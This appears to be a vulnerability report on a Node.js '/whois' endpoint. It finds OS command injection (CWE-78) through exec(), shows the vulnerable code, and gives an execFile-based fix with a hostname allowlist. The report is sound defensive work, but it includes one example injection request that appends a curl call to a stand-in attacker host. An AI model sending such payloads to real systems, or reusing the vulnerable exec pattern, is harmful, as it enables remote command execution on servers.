## Verdict

exploitable (confidence: high)

- CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')
- Location: `WhoisLookupChildProcess.js`, line 15 (inside the `/whois` route handler)

## Source

`req.query.domain` — the `domain` query-string parameter on `GET /whois` — is fully attacker-controlled over HTTP. The only check applied before it reaches the sink is a truthiness check (`if (!domain) ...`), which rejects an empty value but performs no character, length, or format validation.

The value flows unchanged from `req.query.domain` into a template literal passed to `child_process.exec()`:

```
exec(`whois ${domain}`, (error, stdout, stderr) => { ... })
```

`exec()` runs its argument through `/bin/sh -c` (or `cmd.exe /c` on Windows), so any shell metacharacter in `domain` — `;`, `|`, `&&`, backticks, `$()`, etc. — is interpreted by the shell rather than treated as part of a single argument. A request such as `GET /whois?domain=example.com;curl+http://attacker/x` results in the injected command executing with the same privileges as the Node process. This is the sink; there is no intervening sanitization or allowlist, so the path is exploitable as reported.

## Fix

No third-party library is needed. The `whois` protocol has no built-in Node.js client and typically requires server-referral handling that the system `whois` binary already performs, so running the command is the actual feature the endpoint provides (not an incidental wrapper around something `fs`/`http`/`net` could do directly) — per the CWE-78 guidance this is the "unavoidable command" case: keep the execution, and make it safe with a parameterized API plus input validation as a secondary layer.

**Vulnerable code:**

```javascript
const { exec } = require('child_process');
...
  // VULNERABLE: user-controlled `domain` is concatenated into a shell command string
  exec(`whois ${domain}`, (error, stdout, stderr) => {
    if (error) {
      return res.status(500).send('whois lookup failed');
    }
    res.type('text/plain').send(stdout);
  });
```

**Fixed code:**

```javascript
const express = require('express');
const { execFile } = require('child_process');

const app = express();

// Conservative hostname allowlist: labels of letters/digits/hyphens (no
// leading/trailing hyphen), at least one dot. Also guarantees the value
// cannot start with '-', which closes CWE-88 argument/flag injection
// against the whois binary.
const DOMAIN_PATTERN =
  /^[a-zA-Z0-9]([a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?(\.[a-zA-Z0-9]([a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?)+$/;

// Looks up WHOIS registration details for a domain the caller wants to check.
app.get('/whois', (req, res) => {
  const domain = req.query.domain;

  if (!domain) {
    return res.status(400).send('domain query parameter is required');
  }

  if (!DOMAIN_PATTERN.test(domain)) {
    return res.status(400).send('domain query parameter is invalid');
  }

  execFile('whois', [domain], (error, stdout, stderr) => {
    if (error) {
      return res.status(500).send('whois lookup failed');
    }
    res.type('text/plain').send(stdout);
  });
});

app.listen(3000);

module.exports = app;
```

## Explanation

The fix replaces `child_process.exec()` — which builds a single string and hands it to a shell for parsing — with `child_process.execFile()`, which invokes the `whois` binary directly with an explicit argument array and no shell involved. Shell metacharacters in `domain` (`;`, `|`, `&&`, backticks, etc.) are then passed as literal argument bytes to `whois` instead of being interpreted, which closes the command-injection path. A hostname-shaped allowlist regex is added as the secondary defence-in-depth layer the guidance calls for, applied to the same `domain` value that reaches the sink; it also rejects any value starting with `-`, which prevents the value from being read as a flag by the `whois` binary (CWE-88, a distinct gap that an argument array alone does not close). The callback signature, success path (`stdout` returned as `text/plain`), and error path (opaque 500 on failure) are all unchanged, so the sink's existing contract — what it returns, what it discards, and how it fails — is preserved.

## Behaviour changes

- Malformed or non-hostname-shaped `domain` values (previously passed straight to a shell) now receive `400 domain query parameter is invalid` instead of being executed. This is the intended effect of adding allowlist validation, not a side effect.
- No change to success-path output (`stdout` returned as `text/plain`), error-path output (`500 whois lookup failed`, `stderr` still discarded), or process options (no shell was ever explicitly requested, so `execFile`'s default of no shell matches `exec`'s prior default binding of `domain` inside a shell-interpreted string — the difference is that the string is no longer shell-parsed).
- Not applied: invoking `whois` by absolute path (e.g. `/usr/bin/whois`) instead of relying on `PATH` resolution, which the general CWE-78 guidance recommends to prevent a writable `PATH` entry from substituting a different binary. The binary's install location is not guaranteed across the deployment targets this file runs on, and hardcoding a wrong path would break the endpoint outright; this is flagged for the deployer to apply with a path confirmed for their environment rather than guessed here.
